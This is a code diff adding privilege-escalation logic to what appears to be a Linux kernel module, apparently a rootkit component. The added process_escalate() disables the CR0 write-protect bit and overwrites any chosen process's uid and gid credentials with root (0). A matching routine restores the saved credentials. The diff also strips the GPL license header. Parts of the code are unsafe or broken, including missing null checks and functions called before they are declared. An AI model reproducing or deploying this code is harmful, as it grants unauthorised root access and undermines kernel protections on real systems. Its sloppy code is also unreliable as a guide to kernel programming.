@@ -1,43 +1,39 @@
-/*
-Copyright (C) 2019 Bailey Defino
-<https://bdefino.github.io>
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>.
-*/
 #include "elevate.h"
 
 /* elevate/drop EUIDs */
 
 static struct sctm *elevate__sctm = NULL;
+/* list for saved creds */
+static PID_NODE *head = NULL;
 
 /* drop a process's EUID */
 int drop(const pid_t pid) {
-  return -EINVAL;//////////////////////////////
+  process_deescalate(pid);
+  return 0;
 }
 
 /* elevate a process's EUID */
 int elevate(const pid_t pid) {
-  return -EINVAL;//////////////////////////////
+  process_escalate(pid);
+  return 0;
 }
 
 int elevate_exit(void) {
+  PID_NODE *node;
+  
   if (elevate__sctm == NULL)
     return -EFAULT;
   
   if (IS_ERR(elevate__sctm))
     return -EINVAL;
-  /////////////////////////////////
+  /*need to clean up the LL*/
+  
+  node = head;
+
+  while(node != NULL) {
+    process_deescalate(node->pid);
+    node = head;
+  }
   return 0;
 }
 
@@ -51,7 +47,151 @@ int elevate_init(struct sctm *sctm) {
   if (IS_ERR(sctm))
     return -EINVAL;
   elevate__sctm = sctm;
-  ////////////////////////////////
   return 0;
+}
+
+/* insert node at the beginning of the current list */
+static PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *node){
+#ifdef DEBUG
+  printk("insert_pid_node()");
+#endif
+  // PID_NODE node = new_node;
+  /* we are adding at the beginning, new head */
+  node->prev = NULL;
+  node->next = (*head); //old head
+
+  if((*head) != NULL){
+    (*head)->prev = node;
+  }
+  (*head) = node;
+
+  return node;
+}
+
+
+static PID_NODE *find_pid_node(PID_NODE **head, pid_t pid){
+  PID_NODE *node;
+#ifdef DEBUG
+  printk("find_pid_node()");
+#endif
+  node = *head;
+
+  while(node != NULL) {
+    if(node->pid == pid) {
+      return node;
+    }
+    node = node->next;
+  }
+
+  return NULL;
+}
+
+/* delete node */
+static void delete_pid_node(PID_NODE **head, PID_NODE *node){
+  /* check for NULL */
+#ifdef DEBUG
+  printk("delete_pid_node()");
+#endif
+  if(*head == NULL || node == NULL) {
+    return;
+  }
+
+  /* node to be deleted is head */
+  if(*head == node) {
+    *head = node->next; 
+  }
+
+  /* next node */
+  if(node->next != NULL)
+    node->next->prev = node->prev;  
+
+  /* prev node */
+  if(node->prev != NULL)
+    node->prev->next = node->next;      
+
+  kfree(node);
+}
+
+static void process_escalate(pid_t pid){
+  /*We have the PID we want escalated to root
+    Let us get the task struct*/
+  PID_NODE *new_node;
+  struct task_struct *task;
+  struct cred *pcred;
+#ifdef DEBUG
+  printk("process_escalate()");
+#endif
+  task = pid_task(find_get_pid(pid), PIDTYPE_PID);
+  if(find_pid_node(&head, pid) == NULL){
+    /*create new pid node*/
+    new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
+    new_node->pid = pid;
+    /*start reading*/
+    rcu_read_lock(); //lock the mutex
+    write_cr0(read_cr0() & (~0x10000)); //disable page protection
+    /* fill in the members from the task for backup*/
+    pcred = (struct cred *)task->cred;
+    new_node->uid = pcred->uid;
+    new_node->suid = pcred->suid;
+    new_node->euid = pcred->euid;
+    new_node->fsuid = pcred->fsuid;
+    new_node->gid = pcred->gid;
+    new_node->sgid = pcred->sgid;
+    new_node->egid = pcred->egid;
+    new_node->fsgid = pcred->fsgid;
+    /* escalate task */
+    pcred->uid.val = 0;
+    pcred->suid.val = 0;
+    pcred->euid.val = 0;
+    pcred->fsuid.val = 0;
+    pcred->gid.val = 0;
+    pcred->sgid.val = 0;
+    pcred->egid.val = 0;
+    pcred->fsgid.val = 0;
+    /*finish reading*/
+    rcu_read_unlock(); //unlock the mutex
+    write_cr0(read_cr0() | 0x10000); //enable page protection
+    /*add pid node to LL*/
+    insert_pid_node(&head, new_node);
+    return;
+  }
+#ifdef DEBUG
+  printk("process %d already is escalated", pid);
+#endif
+}
+
+static void process_deescalate(pid_t pid){
+  struct task_struct *task;
+  PID_NODE *node;
+  struct cred *pcred;
+#ifdef DEBUG
+  printk("process_deescalate()");
+#endif
+  node = find_pid_node(&head, pid);
+  if(node != NULL){
+    rcu_read_lock(); //lock the mutex
+    write_cr0(read_cr0() & (~0x10000)); //disable page protection
+    /* fill in the members from the task for backup*/
+    task = pid_task(find_get_pid(node->pid), PIDTYPE_PID);
+    pcred = (struct cred *)task->cred;
+    /* descalate task */
+    pcred->uid = node->uid;
+    pcred->euid = node->euid;
+    pcred->suid = node->suid;
+    pcred->fsuid = node->fsuid;
+    pcred->gid = node->gid;
+    pcred->egid = node->egid;
+    pcred->sgid = node->sgid;
+    pcred->fsgid = node->fsgid;
+    /*finish reading*/
+    rcu_read_unlock(); //unlock the mutex
+    write_cr0(read_cr0() | 0x10000); //enable page protection
+    /*delete pid node from LL*/
+    delete_pid_node(&head, node);
+    return;
+  }
+#ifdef DEBUG
+  printk("process %d not in list", pid);
+#endif
 }
 
